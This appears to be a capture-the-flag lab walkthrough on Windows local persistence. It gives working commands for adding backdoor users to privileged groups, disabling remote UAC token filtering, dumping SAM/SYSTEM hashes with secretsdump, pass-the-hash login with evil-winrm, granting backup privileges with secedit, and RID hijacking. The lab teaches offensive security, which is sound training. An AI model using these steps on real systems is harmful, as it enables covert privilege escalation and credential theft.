# Windows Local Persistence

## Introduction

Having an administrator's credential is the easiest way to achieve persistence on a machine. However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which are usually less monitored than administrators, and grant them administrative privileges.

---

## Prerequisites

Click the **Start Machine** button on this task before continuing. The machine will be available on your web browser, but if you prefer connecting via RDP, use the following credentials:

- **Username**: Administrator  
- **Password**: Password321  

> **Note**: When you log in via RDP, the existing in-browser view will be disconnected. After terminating your RDP session, press **Reconnect** to restore the in-browser view.

---

## Assign Group Memberships

### Scenario
We assume you have already gained administrative access and are trying to establish persistence. Additionally, you have dumped the password hashes of the victim machine and successfully cracked the passwords for unprivileged accounts.

### Adding a User to the Administrators Group
To grant administrative privileges to an unprivileged user, add them to the `Administrators` group:

```cmd
net localgroup administrators thmuser0 /add
```

This allows access to the server via RDP, WinRM, or other remote administration services.

### Using the Backup Operators Group
If adding a user to the `Administrators` group seems too suspicious, use the `Backup Operators` group. Users in this group can read/write any file or registry key, bypassing DACLs. This enables copying the SAM and SYSTEM registry hives for password hash recovery.

1. Add the user to the `Backup Operators` group:
    ```cmd
    net localgroup "Backup Operators" thmuser1 /add
    ```

2. Add the user to the `Remote Management Users` group for WinRM access:
    ```cmd
    net localgroup "Remote Management Users" thmuser1 /add
    ```

3. Connect via WinRM using the user's credentials:
    - **Username**: thmuser1  
    - **Password**: Password321  

#### Resolving UAC Restrictions
To regain administrative privileges remotely, disable `LocalAccountTokenFilterPolicy`:

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

#### Backup SAM and SYSTEM Files
1. Save the registry hives:
    ```powershell
    reg save hklm\system system.bak
    reg save hklm\sam sam.bak
    ```

2. Download the files:
    ```powershell
    download system.bak
    download sam.bak
    ```

3. Extract password hashes using `secretsdump.py`:
    ```bash
    python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
    ```

4. Perform Pass-the-Hash to connect as Administrator:
    ```bash
    evil-winrm -i MACHINE_IP -u Administrator -H <NTLM_HASH>
    ```

---

## Special Privileges and Security Descriptors

### Assigning Privileges
Instead of modifying group memberships, assign specific privileges to a user:

1. Export the current configuration:
    ```cmd
    secedit /export /cfg config.inf
    ```

2. Edit `config.inf` to include the user in `SeBackupPrivilege` and `SeRestorePrivilege`.

3. Import the modified configuration:
    ```cmd
    secedit /import /cfg config.inf /db config.sdb
    secedit /configure /db config.sdb /cfg config.inf
    ```

4. Modify the WinRM security descriptor to allow the user to connect:
    ```powershell
    Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
    ```

---

## RID Hijacking

### Overview
Change a user's RID to match the Administrator's RID (500) to grant administrative privileges.

1. Identify the user's RID:
    ```cmd
    wmic useraccount get name,sid
    ```

2. Run `regedit` as SYSTEM:
    ```cmd
    PsExec64.exe -i -s regedit
    ```

3. Navigate to `HKLM\SAM\SAM\Domains\Account\Users\` and locate the user's key by its RID in hexadecimal.

4. Modify the `F` value to replace the user's RID with `0x01F4` (Administrator's RID).

5. Log in as the user to gain Administrator privileges:
    - **Username**: thmuser3  
    - **Password**: Password321  

---

## Flags

1. Use `thmuser1` to execute `C:\flags\flag1.exe` and retrieve the first flag.
2. Use `thmuser2` to execute `C:\flags\flag2.exe` and retrieve the second flag.